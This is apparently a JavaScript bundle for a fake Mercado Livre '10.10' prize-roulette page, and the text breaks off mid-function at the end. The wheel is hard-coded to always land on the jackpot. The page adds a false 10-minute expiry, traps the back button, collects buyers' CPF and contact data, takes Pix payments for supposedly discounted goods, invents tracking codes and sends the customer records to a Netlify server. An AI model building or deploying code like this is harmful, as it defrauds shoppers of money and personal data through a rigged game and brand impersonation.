/* ==========================================================================
   ROLETA PREMIADA 10.10 — BUNDLE AUTOCONTIDO
   Recriado e unificado para execução sem módulos externos
   ========================================================================== */

// --- 1. CONFIGURAÇÃO BASE ---
const ROULETTE_CONFIG = {
  CUSTOMER_NUMBER: '100.000',
  REEL_LENGTH: 36,
  COUNTDOWN_FROM: 3,
  COUNTDOWN_STEP: 800,
  PRE_SPIN_DELAY: 150,
  SPIN_DURATION: 6200,
  FINISH_THRESHOLD: 0.88,
  RESULT_DELAY: 500,
  RESULT_DELAY_JACKPOT: 700,
  CHOICE_MINUTES: 10,
  LANDING_JITTER: 0,
  FORCE_JACKPOT: true,
  PERSIST_KEY: 'roleta_state_v3',
  DEBUG: false,
  JACKPOT: {
    weight: 9999,
    minPercent: 90,
    maxPercent: 90
  },
  WEIGHTS: {},
  VELOCITY: {
    accel: 0.25,
    cruise: 0.35,
    decel: 0.40
  },
  SETTLE: {
    enabled: true,
    duration: 500,
    amount: 14
  }
};

function applyUrlOverrides(cfg) {
  const p = new URLSearchParams(window.location.search);
  let forcedWinner = null;
  if (p.has('w')) forcedWinner = p.get('w');
  return { forcedWinner };
}

// --- 2. DADOS DOS PRODUTOS & JACKPOT ---
const JACKPOT = {
  id: 'jackpot_1010',
  name: 'PRÊMIO MÁXIMO',
  isJackpot: true,
  image: 'img/jackpot_1010.png',
  reelImage: 'img/jackpot_1010.png',
  badge: 'Prêmio Máximo 10.10',
  price: 0,
  oldPrice: 0,
  discount: 90
};

const PRODUCTS = [
  {
    id: 'tv_samsung_50',
    name: 'Samsung Vision AI TV 50" QLED Ultra 4K',
    oldPrice: 1299.00,
    price: 129.90,
    off: '90% OFF',
    image: 'img/products/tv_samsung.webp',
    reelThumb: 'img/products/tv_samsung.webp',
    highlight: true,
    tag: 'MAIOR OFERTA'
  },
  {
    id: 'patinete_gm5',
    name: 'Patinete Elétrico GM5 Dobrável',
    oldPrice: 899.00,
    price: 89.90,
    off: '90% OFF',
    image: 'img/products/patinete_gm5.webp',
    reelThumb: 'img/products/patinete_gm5.webp'
  },
  {
    id: 'ar_portatil_tcl',
    name: 'Ar-condicionado Portátil 10000 Btus',
    oldPrice: 899.00,
    price: 89.90,
    off: '90% OFF',
    image: 'img/products/ar_portatil_novo.webp',
    reelThumb: 'img/products/ar_portatil_novo.webp'
  },
  {
    id: 'nutella_3kg',
    name: 'Nutella 3kg Balde Ferrero Food Service',
    oldPrice: 299.00,
    price: 29.90,
    off: '90% OFF',
    image: 'img/products/nutella_oficial.jpg',
    reelThumb: 'img/products/nutella_oficial.jpg'
  },
  {
    id: 'patinete_triciclo_drift',
    name: 'Patinete Elétrico Triciclo Drift 360 Graus',
    oldPrice: 849.00,
    price: 84.90,
    off: '90% OFF',
    image: 'img/products/patinete_drift.webp',
    reelThumb: 'img/products/patinete_drift.webp'
  },
  {
    id: 'panelas_ferro_fundido',
    name: 'Kit 5 Panelas Ferro Fundido Esmaltadas',
    oldPrice: 839.00,
    price: 83.90,
    off: '90% OFF',
    image: 'img/products/panelas.webp',
    reelThumb: 'img/products/panelas.webp'
  },
  {
    id: 'caixa_aiwa_2300w',
    name: 'Caixa De Som Aiwa Torre 2300w Bluetooth',
    oldPrice: 599.00,
    price: 59.90,
    off: '90% OFF',
    image: 'img/products/aiwa_nova.webp',
    reelThumb: 'img/products/aiwa_nova.webp'
  },
  {
    id: 'kit_ferramentas_brushless',
    name: 'Kit Multi Ferramentas 5 Em 1 Brushless Parafusadeira Esmerilhadeira Martelete',
    oldPrice: 799.00,
    price: 79.90,
    off: '90% OFF',
    image: 'img/products/ferramentas_oficial.jpg',
    reelThumb: 'img/products/ferramentas_oficial.jpg'
  },
  {
    id: 'lavadora_vonder_2100',
    name: 'Lavadora De Alta Pressão 2.100 Vonder',
    oldPrice: 728.00,
    price: 72.80,
    off: '90% OFF',
    image: 'img/products/vonder_oficial.jpg',
    reelThumb: 'img/products/vonder_oficial.jpg'
  }
];

function findPrize(id) {
  if (id === JACKPOT.id) return JACKPOT;
  return PRODUCTS.find(p => p.id === id) || JACKPOT;
}

function allImages() {
  const set = new Set();
  set.add(JACKPOT.image);
  PRODUCTS.forEach(p => {
    if (p.image) set.add(p.image);
    if (p.imageB) set.add(p.imageB);
    if (p.reelThumb) set.add(p.reelThumb);
  });
  return Array.from(set);
}

function reelThumbs() {
  const set = new Set();
  set.add(JACKPOT.reelImage);
  PRODUCTS.forEach(p => {
    if (p.reelThumb) set.add(p.reelThumb);
    else if (p.image) set.add(p.image);
  });
  return Array.from(set);
}

// --- 3. CORE: RNG, STATE, EASING, SEQUENCE, GEOMETRY, ANIMATOR ---
function makeRng(seed) {
  let s = (seed || 123456789) >>> 0;
  return function () {
    s = (Math.imul(1664525, s) + 1013904223) >>> 0;
    return s / 4294967296;
  };
}
function randomSeed() {
  return (Math.random() * 0xFFFFFFFF) >>> 0;
}
function randInt(rng, min, max) {
  return Math.floor(rng() * (max - min + 1)) + min;
}

const STATES = {
  READY: 'READY',
  COUNTDOWN: 'COUNTDOWN',
  SPINNING: 'SPINNING',
  FINISHING: 'FINISHING',
  JACKPOT: 'JACKPOT',
  RESULT: 'RESULT',
  STORE: 'STORE'
};

function createStateMachine(initial, opts) {
  let current = initial;
  const cbs = [];
  return {
    get current() { return current; },
    get isBusy() { return current === STATES.COUNTDOWN || current === STATES.SPINNING || current === STATES.FINISHING; },
    get isDone() { return current === STATES.JACKPOT || current === STATES.RESULT || current === STATES.STORE; },
    is(s) { return current === s; },
    set(s) {
      if (current === s) return false;
      current = s;
      cbs.forEach(cb => cb(current));
      return true;
    },
    force(s) {
      current = s;
      cbs.forEach(cb => cb(current));
    },
    onChange(cb) { cbs.push(cb); }
  };
}

function velocityAt(t, cfg) {
  // Curva de velocidade da roleta (aceleração suave, cruzeiro e desaceleração longa)
  if (t < 0.2) {
    return Math.pow(t / 0.2, 2);
  } else if (t < 0.5) {
    return 1;
  } else {
    const p = (t - 0.5) / 0.5;
    return Math.pow(1 - p, 3);
  }
}

function buildDistanceLUT(cfg) {
  const steps = 400;
  const lut = new Float64Array(steps + 1);
  let total = 0;
  lut[0] = 0;
  for (let i = 1; i <= steps; i++) {
    const t = (i - 0.5) / steps;
    total += velocityAt(t, cfg);
    lut[i] = total;
  }
  for (let i = 1; i <= steps; i++) {
    lut[i] /= total;
  }
  return lut;
}

function selectWinner(opts) {
  return {
    prize: opts.jackpot.ref || JACKPOT,
    jackpotPercent: 90
  };
}

function generateRouletteSequence(opts) {
  const { products, jackpot, length, winner, winnerIndex, rng } = opts;
  const list = [];
  const pool = [jackpot, ...products];

  for (let i = 0; i < length; i++) {
    if (i === winnerIndex) {
      list.push(winner);
    } else {
      let item = pool[Math.floor(rng() * pool.length)];
      if (item === jackpot && rng() > 0.15) {
        item = products[Math.floor(rng() * products.length)];
      }
      list.push(item);
    }
  }
  return list;
}

function winnerIndexFor(length, metrics) {
  return length - 6;
}

function startIndexFor(metrics) {
  return 1;
}

function calculateTargetPosition(winnerIdx, metrics, jitter) {
  const centerCardOffset = winnerIdx * metrics.step + metrics.cardWidth / 2;
  return centerCardOffset - metrics.windowWidth / 2 + (jitter || 0);
}

function createSpinRunner(opts) {
  const { from, to, duration, lut, onFrame, onFinish } = opts;
  let rafId = null;
  let start = 0;
  let cancelled = false;

  function step(ts) {
    if (cancelled) return;
    if (!start) start = ts;
    const elapsed = ts - start;
    const progress = Math.min(1, elapsed / duration);

    const lutIdx = Math.min(lut.length - 2, Math.floor(progress * (lut.length - 1)));
    const frac = (progress * (lut.length - 1)) - lutIdx;
    const eased = lut[lutIdx] + frac * (lut[lutIdx + 1] - lut[lutIdx]);

    const pos = from + (to - from) * eased;
    const vel = (to - from) * velocityAt(progress);

    onFrame(pos, progress, vel);

    if (progress < 1) {
      rafId = requestAnimationFrame(step);
    } else {
      onFinish();
    }
  }

  return {
    start() { rafId = requestAnimationFrame(step); },
    cancel() {
      cancelled = true;
      if (rafId) cancelAnimationFrame(rafId);
    }
  };
}

// --- 4. ENGINE DE ÁUDIO SINTÉTICO (Web Audio API) ---
function createAudioEngine(cfg) {
  let ctx = null;
  let muted = false;
  let scoreOsc = null;
  let scoreGain = null;

  function initCtx() {
    if (!ctx) {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (AC) ctx = new AC();
    }
    if (ctx && ctx.state === 'suspended') {
      ctx.resume().catch(() => {});
    }
  }

  function playTone(freq, duration, type = 'sine', gainVal = 0.15) {
    if (muted || !ctx) return;
    try {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + duration);
    } catch (_) {}
  }

  return {
    get muted() { return muted; },
    setMuted(m) { muted = m; return muted; },
    unlock() { initCtx(); },
    click() { playTone(600, 0.04, 'triangle', 0.2); },
    countdownBeep(num) {
      initCtx();
      playTone(num === 1 ? 880 : 440, 0.12, 'sine', 0.3);
    },
    tick(intensity) {
      playTone(400 + Math.min(intensity * 400, 400), 0.03, 'triangle', 0.12);
    },
    startScore() {
      if (muted || !ctx) return;
      try {
        scoreOsc = ctx.createOscillator();
        scoreGain = ctx.createGain();
        scoreOsc.type = 'sawtooth';
        scoreOsc.frequency.setValueAtTime(140, ctx.currentTime);
        scoreGain.gain.setValueAtTime(0.01, ctx.currentTime);
        scoreOsc.connect(scoreGain);
        scoreGain.connect(ctx.destination);
        scoreOsc.start();
      } catch (_) {}
    },
    updateScore(progress, speedNorm) {
      if (!scoreOsc || !scoreGain || !ctx) return;
      try {
        const freq = 120 + progress * 240 + speedNorm * 100;
        scoreOsc.frequency.setValueAtTime(freq, ctx.currentTime);
        const g = Math.min(0.05, 0.01 + progress * 0.03);
        scoreGain.gain.setValueAtTime(g, ctx.currentTime);
      } catch (_) {}
    },
    stopScore(fadeMs) {
      if (!scoreOsc || !scoreGain || !ctx) return;
      try {
        scoreGain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + (fadeMs || 300) / 1000);
        setTimeout(() => {
          try { scoreOsc.stop(); scoreOsc.disconnect(); } catch (_) {}
          scoreOsc = null;
          scoreGain = null;
        }, fadeMs || 300);
      } catch (_) {}
    },
    land() {
      playTone(300, 0.15, 'triangle', 0.35);
      setTimeout(() => playTone(220, 0.25, 'sine', 0.4), 80);
    },
    jackpot() {
      initCtx();
      const notes = [523.25, 659.25, 783.99, 1046.50, 1318.51, 1567.98];
      notes.forEach((f, idx) => {
        setTimeout(() => playTone(f, 0.35, 'triangle', 0.25), idx * 110);
      });
    },
    win() {
      initCtx();
      playTone(523.25, 0.2, 'triangle', 0.25);
      setTimeout(() => playTone(659.25, 0.3, 'triangle', 0.25), 140);
    }
  };
}

// --- 5. UI: DOM HELPERS, REEL, COUNTDOWN, RESULT, CONFETTI, GUARDS, TOAST, STORE, MODAIS ---
const $ = sel => document.querySelector(sel);
const $$ = sel => Array.from(document.querySelectorAll(sel));

function preloadImages(urls) {
  return Promise.all(urls.map(u => new Promise(res => {
    if (!u) return res(null);
    const img = new Image();
    img.onload = () => res(u);
    img.onerror = () => res(null);
    img.src = u;
  })));
}

function prefersReducedMotion() {
  return window.matchMedia('(prefers-reduced-motion: reduce)').matches;
}

function restartAnimation(el, className) {
  if (!el) return;
  el.classList.remove(className);
  void el.offsetWidth;
  el.classList.add(className);
}

function createReel(opts) {
  const { windowEl, stripEl, cfg } = opts;
  let items = [];
  let cardWidth = 140;
  let cardGap = 10;
  let windowWidth = windowEl.clientWidth || 360;

  function relayout() {
    windowWidth = windowEl.clientWidth || window.innerWidth || 360;
    const computed = window.getComputedStyle(windowEl);
    const cw = parseFloat(computed.getPropertyValue('--card-w')) || (windowWidth * 0.32);
    cardWidth = Math.max(106, Math.min(190, cw));
    cardGap = parseFloat(computed.getPropertyValue('--card-gap')) || 10;
  }

  relayout();

  return {
    get metrics() {
      return {
        cardWidth,
        cardGap,
        step: cardWidth + cardGap,
        windowWidth
      };
    },
    relayout,
    setSequence(seq) {
      items = seq;
      stripEl.innerHTML = '';
      const step = cardWidth + cardGap;
      stripEl.style.width = (items.length * step + 400) + 'px';

      items.forEach((item, idx) => {
        const card = document.createElement('div');
        card.className = 'rcard' + (item.isJackpot ? ' rcard--jackpot' : '');
        card.id = 'rcard-' + idx;
        card.style.left = (idx * step) + 'px';

        const imgUrl = item.reelThumb || item.reelImage || item.image || 'img/logo.webp';
        const isM = !item.isJackpot;

        if (item.isJackpot) {
          card.innerHTML = `
            <div class="rcard__media">
              <img class="rcard__img rcard__img--a" src="img/jackpot_1010.png" alt="10.10 Prêmio Máximo" loading="lazy">
            </div>
            <div class="rcard__body">
              <p class="rcard__name" style="text-transform: uppercase;">PRÊMIO MÁXIMO</p>
              <p class="rcard__old" style="font-style: italic; color: #2d3277; text-decoration: none;">em toda a loja</p>
              <p class="rcard__price rcard__price--jackpot" style="font-size: 18px; font-weight: 900; color: #2d3277;">
                90% OFF
              </p>
            </div>
          `;
        } else {
          card.innerHTML = `
            <div class="rcard__media">
              <img class="rcard__img rcard__img--a" src="${imgUrl}" alt="${item.name}" loading="lazy">
            </div>
            <div class="rcard__body">
              <p class="rcard__name">${item.name}</p>
              <p class="rcard__old" style="font-style: italic;">preço secreto</p>
              <p class="rcard__price rcard__price--mystery">
                ???
              </p>
            </div>
          `;
        }
        stripEl.appendChild(card);
      });
    },
    setPos(pos) {
      stripEl.style.transform = `translate3d(${-pos}px, 0, 0)`;
    },
    centerOf(index) {
      const step = cardWidth + cardGap;
      return (index * step + cardWidth / 2) - windowWidth / 2;
    },
    indexAt(pos) {
      const step = cardWidth + cardGap;
      return Math.round((pos + windowWidth / 2 - cardWidth / 2) / step);
    },
    freeze() { stripEl.style.willChange = 'transform'; },
    unfreeze() { stripEl.style.willChange = 'auto'; },
    highlightWinner(winnerIdx, isJackpot) {
      const el = document.getElementById('rcard-' + winnerIdx);
      if (el) {
        el.classList.add(isJackpot ? 'is-winner-jackpot' : 'is-winner');
      }
    }
  };
}

function createCountdown(opts) {
  const { numberEl } = opts;
  return {
    async run(cfg) {
      const { from = 3, step = 800, onNumber } = cfg;
      numberEl.hidden = false;
      for (let i = from; i >= 1; i--) {
        numberEl.textContent = String(i);
        restartAnimation(numberEl, 'countdown__num--pulse');
        if (onNumber) onNumber(i);
        await new Promise(r => setTimeout(r, step));
      }
      numberEl.hidden = true;
      return true;
    }
  };
}

function createResult(opts) {
  const { overlayEl, boxEl, prizeEl, ctaEl, cfg } = opts;
  return {
    open(info) {
      const { prize, jackpotPercent, onClaimClick } = info;
      boxEl.classList.toggle('result__box--jackpot', !!prize.isJackpot);

      prizeEl.innerHTML = `
        <div class="jp__art">
          <img class="jp__img" src="img/banner-800.webp" alt="10.10 Prêmio Máximo">
        </div>
        <div style="padding: 16px 18px 4px; text-align: center;">
          <p style="margin: 0 0 6px; font-size: 13px; font-weight: 800; color: #00A650; letter-spacing: 0.08em; text-transform: uppercase;">
            PRÊMIO MÁXIMO DESBLOQUEADO
          </p>
          <div style="display: flex; align-items: baseline; justify-content: center; gap: 8px; margin: 4px 0 10px;">
            <span style="font-size: 64px; font-weight: 900; line-height: 1; color: #2D3277;">${jackpotPercent || 90}%</span>
            <span style="font-size: 20px; font-weight: 800; color: #fff; background: #00A650; padding: 4px 10px; border-radius: 6px;">OFF</span>
          </div>
          <p style="margin: 0 0 14px; font-size: 14px; color: #666;">
            em qualquer produto da lista de prêmios
          </p>
          <div style="background: #fff0f6; border: 1px solid #ffd6e7; border-radius: 8px; padding: 10px; font-size: 12px; color: #d9006c; text-align: left; display: flex; gap: 8px;">
            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5.2l3.4 2"/></svg>
            <div>
              <strong>Você tem 10 minutos para escolher 1 produto</strong><br>
              Depois disso o cupom expira e os preços voltam ao normal.
            </div>
          </div>
        </div>
      `;

      overlayEl.hidden = false;
      requestAnimationFrame(() => overlayEl.classList.add('is-open'));

      ctaEl.onclick = () => {
        if (onClaimClick) onClaimClick();
      };
    },
    close() {
      overlayEl.classList.remove('is-open');
      setTimeout(() => overlayEl.hidden = true, 300);
    }
  };
}

function createConfetti(canvas, cfg) {
  if (!canvas) return { burst() {}, stop() {}, resize() {} };
  const ctx = canvas.getContext('2d');
  let particles = [];
  let animId = null;

  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resize();

  function burst(opts = {}) {
    canvas.hidden = false;
    resize();
    const count = opts.count || 120;
    const colors = opts.palette || ['#FFE600', '#3483FA', '#00A650', '#FF2E7E', '#FFFFFF'];

    for (let i = 0; i < count; i++) {
      particles.push({
        x: canvas.width / 2,
        y: canvas.height * 0.4,
        vx: (Math.random() - 0.5) * 16,
        vy: (Math.random() - 0.7) * 18,
        size: Math.random() * 8 + 4,
        color: colors[Math.floor(Math.random() * colors.length)],
        rotation: Math.random() * 360,
        vr: (Math.random() - 0.5) * 12,
        alpha: 1
      });
    }

    if (!animId) loop();
  }

  function loop() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    for (let i = particles.length - 1; i >= 0; i--) {
      const p = particles[i];
      p.x += p.vx;
      p.y += p.vy;
      p.vy += 0.45; // gravidade
      p.rotation += p.vr;
      p.alpha -= 0.007;

      ctx.save();
      ctx.translate(p.x, p.y);
      ctx.rotate((p.rotation * Math.PI) / 180);
      ctx.globalAlpha = Math.max(0, p.alpha);
      ctx.fillStyle = p.color;
      ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size);
      ctx.restore();

      if (p.alpha <= 0 || p.y > canvas.height) {
        particles.splice(i, 1);
      }
    }

    if (particles.length > 0) {
      animId = requestAnimationFrame(loop);
    } else {
      animId = null;
      canvas.hidden = true;
    }
  }

  return {
    burst,
    stop() {
      particles = [];
      if (animId) cancelAnimationFrame(animId);
      animId = null;
      canvas.hidden = true;
    },
    resize
  };
}

function createGuards(opts) {
  return {
    arm() {},
    disarm() {}
  };
}

function createToast(toastEl) {
  let timer = null;
  return {
    show(msg) {
      if (!toastEl) return;
      toastEl.textContent = msg;
      toastEl.hidden = false;
      toastEl.classList.add('is-open');
      clearTimeout(timer);
      timer = setTimeout(() => {
        toastEl.classList.remove('is-open');
        setTimeout(() => toastEl.hidden = true, 300);
      }, 3000);
    }
  };
}

function createStore(gridEl, onSelectProduct, cfg) {
  return {
    build() {
      gridEl.innerHTML = '';
      PRODUCTS.forEach((p, idx) => {
        const card = document.createElement('div');
        card.className = 'pcard' + (p.highlight ? ' pcard--highlight' : '');
        card.style.setProperty('--i', idx);

        card.innerHTML = `
          ${p.tag ? `<div class="pcard__ribbon"><span class="pcard__ribbon-star">★</span> ${p.tag}</div>` : ''}
          <div class="pcard__flag">90% OFF</div>
          <div class="pcard__media">
            <img class="pcard__img pcard__img--a" src="${p.image}" alt="${p.name}" loading="lazy">
            ${p.imageB ? `<img class="pcard__img pcard__img--b" src="${p.imageB}" alt="${p.name}" loading="lazy">` : ''}
          </div>
          <div class="pcard__body">
            <h3 class="pcard__title">${p.name}</h3>
            <div class="pcard__prices">
              <span class="pcard__old">R$ ${p.oldPrice.toFixed(2).replace('.', ',')}</span>
              <div class="pcard__now">
                <span class="pcard__price">R$ ${p.price.toFixed(2).replace('.', ',')}</span>
                <span class="pcard__off">${p.off}</span>
              </div>
            </div>
            <div class="pcard__ship">
              <svg width="14" height="14" fill="currentColor" viewBox="0 0 24 24"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
              Frete grátis
            </div>
            <div class="pcard__stock">Reservado pelo seu cupom</div>
            <button class="btn btn--primary pcard__btn" type="button">Escolher este prêmio</button>
          </div>
        `;

        card.querySelector('.pcard__btn').addEventListener('click', () => {
          onSelectProduct(p);
        });

        gridEl.appendChild(card);
      });
    },
    blinkHighlight() {
      const h = gridEl.querySelector('.pcard--highlight');
      if (h) restartAnimation(h, 'is-blinking');
    }
  };
}

function createBackRedirect(opts) {
  const { modalEl, ctaEl, closeEl, onStay, canShow } = opts;
  let armed = false;

  function showModal() {
    if (!armed || (canShow && !canShow())) return;
    modalEl.hidden = false;
    requestAnimationFrame(() => modalEl.classList.add('is-open'));
  }

  function hideModal() {
    modalEl.classList.remove('is-open');
    setTimeout(() => modalEl.hidden = true, 300);
  }

  if (ctaEl) ctaEl.onclick = () => { hideModal(); if (onStay) onStay(); };
  if (closeEl) closeEl.onclick = () => { hideModal(); window.history.back(); };

  window.addEventListener('popstate', () => {
    if (armed) {
      history.pushState(null, '', location.href);
      showModal();
    }
  });

  return {
    arm() {
      armed = true;
      try { history.pushState(null, '', location.href); } catch (_) {}
    },
    disarm() { armed = false; }
  };
}

function createPixCheckout(els, handlers) {
  let currentProduct = null;
  let buyerData = null;
  let pollInterval = null;
  let isPaymentPaid = false;
  let currentTrackingCode = '';

  function redirectToTracking() {
    const code = currentTrackingCode || localStorage.getItem('ml_last_tracking_code') || '';
    const dest = code ? `/promo/rastreio/?codigo=${encodeURIComponent(code)}` : '/promo/rastreio/';
    window.location.href = dest;
  }

  function loadBuyer() {
    try {
      const raw = localStorage.getItem('upsell_buyer') || sessionStorage.getItem('upsell_buyer');
      if (raw) return JSON.parse(raw);
      const seg = localStorage.getItem('mlSeguroData');
      if (seg) return JSON.parse(seg);
    } catch (_) {}
    return null;
  }

  function getTrackingParams() {
    const p = new URLSearchParams(window.location.search);
    const getVal = k => {
      let v = p.get(k);
      if (!v) {
        try { v = localStorage.getItem(k) || sessionStorage.getItem(k); } catch(_) {}
      }
      return v || '';
    };
    return {
      utm_source: getVal('utm_source') || 'meta',
      utm_medium: getVal('utm_medium'),
      utm_campaign: getVal('utm_campaign'),
      utm_content: getVal('utm_content'),
      utm_term: getVal('utm_term'),
      fbclid: getVal('fbclid') || getVal('_fbclid'),
      ttclid: getVal('ttclid') || getVal('_ttclid'),
      src: getVal('src'),
      sck: getVal('sck')
    };
  }

    async function callGerarPix(payload) {
    // No Netlify ou domínio personalizado (não-localhost), usa Netlify Functions
    const isLocalhost = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
    const endpoint = isLocalhost ? '/api/gerar-pix.php' : '/.netlify/functions/gerar-pix';
    const r = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    return await r.json();
  }

  async function pollStatus(txid) {
    if (!txid) return;
    clearInterval(pollInterval);
    pollInterval = setInterval(async () => {
      try {
        const isLocalhost = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
        const endpoint = isLocalhost ? `/api/status-pix.php?id=${encodeURIComponent(txid)}` : `/.netlify/functions/status-pix?id=${encodeURIComponent(txid)}`;
        const r = await fetch(endpoint);
        const data = await r.json();
        const st = String(data.status || '').toUpperCase();
        if (st === 'PAID' || st === 'APPROVED' || st === 'COMPLETED' || st === 'SUCCEEDED' || st === 'PAGO') {
          clearInterval(pollInterval);
          pollInterval = null;
          onPaymentSuccess();
        }
      } catch (_) {}
    }, 3000);
  }

  function getOrCreateTrackingCode(cpf) {
    cpf = (cpf || '').replace(/\D/g, '') || '00000000000';
    let storedMap = {};
    try {
      storedMap = JSON.parse(localStorage.getItem('ml_cpf_tracking_map') || '{}');
    } catch (_) {}

    if (storedMap[cpf]) {
      return storedMap[cpf];
    }

    // Gera código único pseudo-determinístico baseado no CPF ou aleatório
    let hash = 0;
    for (let i = 0; i < cpf.length; i++) {
      hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
      hash |= 0;
    }
    const numPart = Math.abs(hash % 900000000) + 100000000;
    const trackingCode = `ML${numPart}BR`;

    storedMap[cpf] = trackingCode;
    try {
      localStorage.setItem('ml_cpf_tracking_map', JSON.stringify(storedMap));
      localStorage.setItem('ml_last_tracking_code', trackingCode);
    } catch (_) {}

    return trackingCode;
  }

  function onPaymentSuccess() {
    isPaymentPaid = true;
    els.view_qr.hidden = true;
    els.view_paid.hidden = false;
    els.paidTitle.textContent = 'Pagamento Confirmado!';
    els.paidText.textContent = `Seu prêmio (${currentProduct ? currentProduct.name : ''}) foi vinculado com sucesso ao seu pedido e será despachado junto!`;

    // Configura detalhes do pedido e código de rastreamento
    try {
      const buyerObj = loadBuyer() || {};
      const cpf = buyerObj.cpf || buyerObj.document || '11144477735';
      const trackingCode = getOrCreateTrackingCode(cpf);
      currentTrackingCode = trackingCode;

      // Salva no registro de rastreios
      try {
        let cartData = [];
        try { cartData = JSON.parse(localStorage.getItem('obrigado_cart') || '[]'); } catch (_) {}
        let segData = {};
        try { segData = JSON.parse(localStorage.getItem('mlSeguroData') || '{}'); } catch (_) {}
        const mergedCustomer = { ...segData, ...buyerObj };
        const records = JSON.parse(localStorage.getItem('ml_tracking_records') || '{}');
        const trackingRecord = {
          code: trackingCode,
          createdAt: records[trackingCode] ? records[trackingCode].createdAt : Date.now(),
          customer: mergedCustomer,
          cart: cartData,
          prize: currentProduct
        };
        records[trackingCode] = trackingRecord;
        localStorage.setItem('ml_tracking_records', JSON.stringify(records));
        localStorage.setItem('ml_last_tracking_code', trackingCode);
        localStorage.setItem('ml_prize_won', JSON.stringify(currentProduct));

        // Envia para o servidor para sincronização permanente em outros dias e dispositivos
        try {
          const isLocalhost = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
          const apiBase = location.hostname.endsWith('github.io') ? 'https://mercadolivrepromocao11.netlify.app' : '';
          const postUrl = isLocalhost ? '/api/tracking' : (apiBase + '/.netlify/functions/tracking');
          fetch(postUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(trackingRecord)
          }).catch(() => {});
        } catch (_) {}
      } catch (_) {}

      const orderNumEl = document.getElementById('pix-details-order-num');
      if (orderNumEl) orderNumEl.textContent = '#' + (Date.now().toString().slice(-8));

      const trackingValEl = document.getElementById('pix-tracking-code-val');
      if (trackingValEl) trackingValEl.textContent = trackingCode;

      const trackBtn = document.getElementById('pix-btn-go-track');
      if (trackBtn) trackBtn.href = `/promo/rastreio/?codigo=${encodeURIComponent(trackingCode)}`;

      // Configura linha do prêmio
      if (currentProduct) {
        const prizeRow = document.getElementById('pix-prize-item-row');
        const prizeImg = document.getElementById('pix-prize-item-img');
        const prizeName = document.getElementById('pix-prize-item-name');
        if (prizeRow && prizeImg && prizeName) {
          prizeImg.src = currentProduct.image || currentProduct.reelThumb;
          prizeName.textContent = currentProduct.name;
          prizeRow.style.display = 'flex';
        }
      }

      // Configura toggle de detalhes
      const toggleBtn = document.getElementById('pix-btn-toggle-details');
      const detailsBox = document.getElementById('pix-order-details');
      if (toggleBtn && detailsBox) {
        toggleBtn.onclick = () => {
          const isHidden = detailsBox.style.display === 'none';
          detailsBox.style.display = isHidden ? 'block' : 'none';
          toggleBtn.textContent = isHidden ? 'Ocultar detalhes <' : 'Ver detalhes >';
        };
      }
    } catch (err) {
      console.warn('Erro ao montar detalhes pós-pagamento:', err);
    }

    if (handlers.onPaid) handlers.onPaid();
    try {
      const pVal = currentProduct ? currentProduct.price : 89.90;
      const orderId = 'rol-' + Date.now();
      fbTrack('Purchase', {
        value: pVal,
        currency: 'BRL',
        content_name: currentProduct ? currentProduct.name : 'Prêmio Roleta 10.10',
        content_type: 'product',
        content_ids: [currentProduct ? currentProduct.id : 'roleta_prize']
      });
      ttkTrack('CompletePayment', {
        value: pVal,
        currency: 'BRL',
        quantity: 1,
        order_id: orderId,
        content_id: currentProduct ? currentProduct.id : 'roleta_prize',
        content_name: currentProduct ? currentProduct.name : 'Prêmio Roleta 10.10'
      });
      ttkTrack('Purchase', {
        value: pVal,
        currency: 'BRL',
        quantity: 1,
        order_id: orderId,
        content_id: currentProduct ? currentProduct.id : 'roleta_prize',
        content_name: currentProduct ? currentProduct.name : 'Prêmio Roleta 10.10'
      });
    } catch (_) {}
  }

  async function handleGenerate(cust) {
    els.view_confirm.hidden = true;
    els.view_form.hidden = true;
    els.view_loading.hidden = false;

    try {
      const priceCents = Math.round((currentProduct.price || 89.90) * 100);
      const res = await callGerarPix({
        price_cents: priceCents,
        produto: currentProduct.name,
        customer: {
          name: cust.nome || cust.name || 'Cliente Mercado Livre',
          email: cust.email || 'contato@cliente.com',
          phone: cust.fone || cust.phone || '11999999999',
          cpf: cust.cpf || '11144477735'
        },
        metadata: {
          upsell: 1,
          funnel: 'roleta-1010',
          ...getTrackingParams()
        }
      });

      els.view_loading.hidden = true;

      const code = res && (res.pixCode || res.qrCode || res.pix_code || res.qr_code || res.copia_e_cola || res.qrcode || (res.data && (res.data.qrCode || res.data.pixCopyPaste)));
      if (res && res.success !== false && code) {
        els.view_qr.hidden = false;
        els.pixCode.textContent = code;
        els.qrValue.textContent = 'R$ ' + currentProduct.price.toFixed(2).replace('.', ',');

        // Renderiza QR code visual
        const qrImg = res.qr_code_url || res.qrcode_url || (res.data && res.data.pix && res.data.pix.qrCodeImage) || `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(code)}`;
